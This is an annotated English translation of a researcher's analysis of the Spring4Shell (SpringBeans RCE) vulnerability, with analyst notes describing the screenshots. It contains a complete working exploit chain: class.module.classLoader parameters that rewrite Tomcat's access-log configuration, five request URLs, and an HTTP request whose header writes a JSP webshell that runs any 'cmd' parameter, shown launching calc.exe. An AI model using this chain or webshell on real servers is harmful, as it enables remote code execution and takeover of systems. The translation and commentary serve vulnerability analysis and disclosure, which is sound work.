This is a translated version of the Vulnerability Analysis document ([original here](https://github.com/tweedge/springcore-0day-en/blob/main/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20(Vulnerability%20Analysis).pdf)) that the PoC author (`p1n93r`) released. It contains my own annotations as and dissections of screenshots as well. I hope it helps!

# SpringBeans RCE Vulnerability Analysis (Translated)

## Requirements
* JDK9 and above
* Using the Spring-beans package
* Spring parameter binding is used
* Spring parameter binding uses non-basic parameter types, such as general POJOs

> *Analyst's note:* This stated that the vulnerability can only attain RCE in nondefault cases. The author later claims this is a reasonable use of SpringBeans. Since this is not the *default* case, I'm laying shame on any news outlet claiming this vulnerability is the next log4shell. It categorically isn't.

## Demo

```
https://github.com/p1n93r/spring-rce-war
```

> *Analyst's note:* Gone, and no saved version. :/

## Vulnerability Analysis
Spring parameter binding does not introduce too much, you can do it yourself; its basic usage is to use the form of `.` to assign values to parameters. The actual assignment process will use reflection to call the parameters `getter` or `setter`.

When this vulnerability first came out, I thought it was a rubbish hole, because I thought there was a Class type attribute in the parameters that I needed to use, and no fool would open it.
I will use this property in POJOs; but when I follow it carefully, I find that things are not so simple.

For example, the data structure of the parameters I need to bind is as follows, which is a very simple POJO:

```
/**
* @author : p1n93r
* @date : 2022/3/29 17:34
*/
@Setter
@Getter

public class EvalBean {
    public EvalBean() throws ClassNotFoundException {
        System.out.println("[+] called EvalBean.EvalBean");
    }

    public String name;
    public CommonBean commonBean;

    public String getName() {
        System.out.println("[+] called EvalBean.getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("[+] called EvalBean.setName");
        this.name = name;
    }

    public CommonBean getCommonBean() {
        System.out.println("[+] called EvalBean.getCommonBean");
        return commonBean;
    }

    public void setCommonBean(CommonBean commonBean) {
        System.out.println("[+] called EvalBean.setCommonBean");
        this.commonBean = commonBean;
    }
}
```

My Controller is written as follows, which is also very normal:

```
@RequestMapping("/index")
public void index(EvalBean evalBean, Model model) {
    System.out.println("=================");
    System.out.println(evalBean);
    System.out.println("=================");
}
```

So I started the whole process of parameter binding. When I followed the call position as follows, I was stunned.

> *Analyst's notes on screenshot 1*
>
> The author then shows a screenshot of `BreanWrapperImpl.class` (see [Spring Frameworks BeanWrapperImpl docs](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/beans/BeanWrapperImpl.html)) with an arrow pointing to `this.getCachedIntrospectionResults()` on line 110, with the label "Find property names from this cache."
> 
> The full line is:
>
> `PropertyDescriptor pd = this.getCachedIntrospectionResults() getPropertyDescriptor(propertyName);`
>
> Additionally, the author highlights several bind and [set/apply]PropertyValue events in their debugger, with the note "the process of Spring parameter binding."

When I looked at this "cache", I was stunned, why is there a "class" attribute cache here? ? ? ! ! ! ! !

> *Analyst's notes on screenshot 2*
>
> The author is still viewing the same `BreanWrapperImpl.class` file, hovering over `this.getCachedIntrospectionResults()` and using IntelliJ's Evaluate function. They show that the `propertyDescriptorCache` class definition is:
>
> `"class" -> (GenericTypeAwarePropertyDescriptor@5848) *org.springframework.beans.GenericTypeAwarePropertyDescriptor ...`
>
> And comment: "There is actually a class. There is no need to store the class attribute in the POJO we use at all. When spring defines parameters, it will bring a class property used to refer to the POJO class to be bound."


When I saw this, I knew I was wrong, this is not a garbage hole, it is really a nuclear bomb-level loophole! Now it is clear that we can easily get the class pair.

For example, the rest is to use this class object to construct the utilization chain. At present, the simpler way is to modify the log configuration of Tomcat and write the shell to the log.

The complete utilization chain is as follows:

```
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%66%75%63%6b%7d%69
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=%48%3a%5c%6d%79%4a%61%76%61%43%6f%64%65%5c%73%74%75%70%69%64%52%7
class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuckJsp
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

Looking at the utilization chain, you can see that it is a very simple way to modify the Tomcat log configuration and use the log to write a shell; the specific attack steps are as follows, and the following five requests are sent successively:

```
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%66%75%6
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.directory=%48%3a%5c%6d
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuckJsp
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

After sending these five requests, Tomcat's log configuration is modified as follows:

> *Analyst's notes on screenshot 3*
>
> The author is now viewing a code fragment of `((WebappClassLoaderBase)evalBean.getClass().getClassLoader().getResources().getContext().getParent().getPipeline().getFirst();`
> 
> They show that for the AccessLogValve, the suffix is now `.jsp`, the the prefix is now `fuckJsp`, etc. - basically showing that the parameters they claim to be setting above have been saved to the `AccessLogValve`, overwriting the original configuration. **The goal of this is to manipulate this alleged vulnerability to create a log file with valid JSP in it to use as a webshell, which the attacker can then utilize normally.**

Then we just need to send a random request, add a header called fuck, and write to the shell:

```
GET /stupidRumor_war_exploded/fuckUUUU HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
fuck: <%Runtime.getRuntime().exec(request.getParameter("cmd"))%>
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

> *Analyst's notes on screenshot 4*
>
> The author shows a directory view which includes a presumably-new file titled `fuckJsp.jsp` - which the author claims to have set as the `AccessLogValve` with their above exploit. This is claimed to work because they set the logger to log the `fuck` headers of requests to `fuckJsp.jsp`. `fuckJsp.jsp` contains the contents:
>
> `-`
> `<%Runtime.getRuntime().exec(requests.getParameter("cmd"));%>`
> `-`
>
> A simple webshell which executes anything given in the `cmd` parameter, which the author points to with the descriptor "successfully wrote the shell."

The shell can be accessed normally:

> *Analyst's notes on screenshot 5*
>
> The author now shows Burp overlaid with `calc.exe` open after running a GET request to `/stupidRumor_war_exploded/fuckJsp.jsp?cmd=calc`

## Summary

* Now that the class object can be called, the use method must not write the log;
* I can follow it later. Why is a POJO class reference retained during the parameter binding process?
